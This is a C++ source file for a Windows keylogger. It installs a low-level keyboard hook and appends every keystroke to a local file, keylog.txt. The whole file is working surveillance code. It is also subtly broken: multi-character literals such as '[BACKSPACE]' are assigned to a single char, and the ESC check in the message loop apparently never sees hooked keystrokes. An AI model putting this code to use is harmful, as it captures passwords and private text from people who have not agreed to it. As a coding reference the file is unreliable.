#include <windows.h>
#include <fstream>
#include <iostream>

// File to save the logged keys
const char* LOG_FILE = "keylog.txt";

// Function to log keys to a file
void LogKey(char key) {
    std::ofstream logfile(LOG_FILE, std::ios::app);
    if (logfile.is_open()) {
        logfile << key;
        logfile.close();
    }
}

// Hook procedure to handle keypress events
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        char key = (char)pKeyboard->vkCode;

        // Log special keys in human-readable format
        switch (pKeyboard->vkCode) {
            case VK_BACK: key = '[BACKSPACE]'; break;
            case VK_RETURN: key = '\n'; break;
            case VK_SPACE: key = ' '; break;
            case VK_TAB: key = '[TAB]'; break;
            case VK_SHIFT: key = '[SHIFT]'; break;
            case VK_CONTROL: key = '[CTRL]'; break;
            case VK_MENU: key = '[ALT]'; break;
            default:
                if (key >= 0x41 && key <= 0x5A) {
                    // Convert to lowercase if not pressed with Shift
                    key = GetAsyncKeyState(VK_SHIFT) ? key : tolower(key);
                }
                break;
        }

        LogKey(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Set the keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    std::cout << "Keylogger running. Press ESC to exit.\n";

    // Keep the program running until ESC is pressed
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook before exiting
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}